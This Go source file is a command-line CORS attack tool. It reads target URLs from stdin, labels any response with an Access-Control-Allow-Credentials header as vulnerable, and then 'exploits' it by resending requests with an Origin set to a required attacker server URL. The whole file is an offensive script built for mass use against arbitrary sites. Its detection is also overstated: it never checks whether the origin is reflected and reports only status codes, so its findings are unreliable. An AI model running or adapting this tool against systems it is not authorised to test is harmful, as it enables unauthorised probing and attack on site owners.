package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

var (
	serverURL   string
	statusCode  int
)

func signalHandler(c chan os.Signal) {
	for {
		sig := <-c
		fmt.Printf("\nExecution stopped by signal: %v\n", sig)
		os.Exit(0)
	}
}

func performCORSAttack(url string, serverURL string, expectedStatusCode int, wg *sync.WaitGroup) {
	defer wg.Done()

	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
	}

	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Printf("[-] Error creating request for %s: %s\n", url, err)
		return
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[-] Error requesting %s: %s\n", url, err)
		return
	}

	defer resp.Body.Close()

	if expectedStatusCode > 0 && resp.StatusCode != expectedStatusCode {
		return
	}

	if _, ok := resp.Header["Access-Control-Allow-Credentials"]; ok {
		fmt.Printf("[+] Potential CORS vulnerability found at %s\n", url)

		if _, originOK := resp.Header["Access-Control-Allow-Origin"]; originOK {
			fmt.Println("[+] Exploiting CORS vulnerability...")

			// Modify and add your payloads here
			payloads := []map[string]string{
				{"Origin": serverURL},
				{"Origin": "https://" + serverURL},
				// Add more payloads as needed
			}

			for _, payload := range payloads {
				client := &http.Client{}
				req, err := http.NewRequest("GET", url, nil)
				if err != nil {
					fmt.Printf("[-] Error creating exploit request: %s\n", err)
					return
				}

				for key, value := range payload {
					req.Header.Set(key, value)
				}

				exploitResp, err := client.Do(req)
				if err != nil {
					fmt.Printf("[-] Error exploiting vulnerability: %s\n", err)
					return
				}

				defer exploitResp.Body.Close()

				fmt.Printf("[+] Exploit response status code: %d\n", exploitResp.StatusCode)
			}
		}
	}
}

func printBanner() {
	banner := `
 ______     ______     ______     ______    
/\  ___\   /\  __ \   /\  == \   /\  ___\   
\ \ \____  \ \ \/\ \  \ \  __<   \ \___  \  
 \ \_____\  \ \_____\  \ \_\ \_\  \/\_____\ 
  \/_____/   \/_____/   \/_/ /_/   \/_____/ 
                                              
	adrianalvird [ 1.0.0 ]
`
	fmt.Println(banner)
}


func main() {
	serverURLPtr := flag.String("s", "", "Attacker server URL")
	expectedStatusCodePtr := flag.Int("sc", 0, "Expected status code")
	flag.Parse()
	printBanner()

	serverURL = *serverURLPtr
	statusCode = *expectedStatusCodePtr

	if serverURL == "" {
		fmt.Println("Error: -s flag is required.")
		flag.PrintDefaults()
		os.Exit(1)
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt)

	go signalHandler(c)

	var wg sync.WaitGroup

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		targetURL := strings.TrimSpace(scanner.Text())
		wg.Add(1)
		go performCORSAttack(targetURL, serverURL, statusCode, &wg)
		time.Sleep(100 * time.Millisecond) // Introduce a delay between requests to avoid potential issues
	}

	wg.Wait()
}

